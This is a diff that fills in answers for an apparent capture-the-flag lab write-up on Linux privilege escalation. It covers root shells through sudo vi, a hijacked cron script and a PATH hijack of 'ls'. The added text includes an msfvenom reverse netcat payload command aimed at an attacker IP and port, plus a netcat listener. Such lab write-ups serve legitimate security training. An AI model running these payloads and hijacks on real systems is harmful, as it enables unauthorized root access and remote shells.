@@ -148,126 +148,109 @@ Just realized we were supposed to answers these questions using `linenum`. So af
 
 1. First, let's exit out of root from our previous task by typing"exit". Then use"su"to swap to user8, with the password"password"
 
-
-
-   ><details><summary>Click for answer</summary></details>
-
 2. Let's use the"sudo -l"command, what does this user require (or not require) to run vi as root?
 
+   After switching to user8 we run `sudo -l` to see what they can run with sudo.
 
+   VI SUDO
 
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>NOPASSWD</details>
 
 3. So, all we need to do is open vi as root, by typing"sudo vi"into the terminal.
 
-
-
-   ><details><summary>Click for answer</summary></details>
-
 4. Now, type":!sh"to open a shell!
 
-
-
-   ><details><summary>Click for answer</summary></details>
+   VI SHELL
 
 ### Exploiting Crontab
 
 1. First, let's exit out of root from our previous task by typing"exit". Then use"su"to swap to user4, with the password"password"
 
-
-
-   ><details><summary>Click for answer</summary></details>
-
 2. Now, on our host machine- let's create a payload for our cron exploit using msfvenom.
-
-
-
-   ><details><summary>Click for answer</summary></details>
 
 3. What is the flag to specify a payload in msfvenom?
 
+   The can be found in the manual for msfvenom.
 
-
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>-p</details>
 
 4. Create a payload using:"msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R"
 
-
-
-   ><details><summary>Click for answer</summary></details>
-
 5. What directory is the "autoscript.sh" under?
 
+   This was found during our linenum scan.
 
-
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>/home/user4/Desktop</details>
 
 6. Lets replace the contents of the file with our payload using:"echo [MSFVENOM OUTPUT] > autoscript.sh"
 
-
-
-   ><details><summary>Click for answer</summary></details>
-
-7. After copying the code into autoscript.sh 
-file we wait for cron to execute the file, and start our netcat listener using:"nc -lvnp 8888"and wait for our shell to land!
-
-
-
-   ><details><summary>Click for answer</summary></details>
+7. After copying the code into autoscript.sh file we wait for cron to execute the file, and start our netcat listener using:"nc -lvnp 8888"and wait for our shell to land!
 
 8. After about 5 minutes, you should have a shell as root land in your netcat listening session! Congratulations!
 
+   We will create our (oneliner) payload with `msfvenom` using `-f raw`. This creates a one-liner we can use in the file.
 
+   ```console
+   msfvenom -p cmd/unix/reverse_netcat lhost=10.18.78.136 lport=1337 -f raw
+   ```
 
-   ><details><summary>Click for answer</summary></details>
+   CRONTAB PAYLOAD
+
+   Now we can add this line to the script on the target machine.
+
+   CRONTAB SCRIPT
+
+   Now we must set-up a netcat listener on our attackbox and we should receive a connection within five minutes.
+
+   CRONTAB SHELL
 
 ### Exploiting PATH Variable
 
 1. Going back to our local ssh session, not the netcat root session, you can close that now, let's exit out of root from our previous task by typing"exit". Then use"su"to swap to user5, with the password"password"
 
-
-
-   ><details><summary>Click for answer</summary></details>
-
 2. Let's go to user5's home directory, and run the file"script". What command do we think that it's executing?
 
+   After navigating to the script and running it with `./script` we see a list of files and folders. This probably means it uses the `ls` command.
 
+   PATH SCRIPT
 
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>ls</details>
 
 3. Now we know what command to imitate, let's change directory to"tmp".
 
+A4. Now we're inside tmp, let's create an imitation executable. The format for what we want to do is:echo "[whatever command we want to run]" > [name of the executable we're imitating]What would the command look like to open a bash shell, writing to a file with the name of the executable we're imitating
 
+   To run a bash shell we must use `/bin/bash`. So we need this in our ls executable.
 
-   ><details><summary>Click for answer</summary></details>
-
-4. Now we're inside tmp, let's create an imitation executable. The format for what we want to do is:echo "[whatever command we want to run]" > [name of the executable we're imitating]What would the command look like to open a bash shell, writing to a file with the name of the executable we're imitating
-
-
-
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>echo "/bin/bash" > ls</details>
 
 5. Great! Now we've made our imitation, we need to make it an executable. What command do we execute to do this?
 
+   We need to use `chmod` for this, with the x argument.
 
-
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>chmod +x ls</details>
 
 6. Now, we need to change the PATH variable, so that it points to the directory where we have our imitation"ls"stored! We do this using the command"export PATH=/tmp:$PATH"Note, this will cause you to open a bash prompt every time you use"ls". If you need to use"ls"before you finish the exploit, use"/bin/ls"where the real"ls"executable is.Once you've finished the exploit, you can exit out of root and use"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH"to reset the PATH variable back to default, letting you use"ls"again!
 
-
-
-   ><details><summary>Click for answer</summary></details>
-
 7. Now, change directory back to user5's home directory.
-
-
-
-   ><details><summary>Click for answer</summary></details>
 
 8. Now, run the "script" file again, you should be sent into a root bash prompt! Congratulations!
 
+   We first put the following command in an executable called `ls` in the `/tmp` folder (don't forget to make it executable).
 
+   ```console
+   echo "/bin/bash" > ls
+   chmod +x ls
+   ```
 
-   ><details><summary>Click for answer</summary></details>
+   The we prepend this folder to the PATH variable with:
 
+   ```console
+   export PATH=/tmp:$PATH
+   ```
+
+   PATH MODIFY
+
+   Now all we need to do is run the script from the home folder to get a root shell.
+
+   PATH SHELL
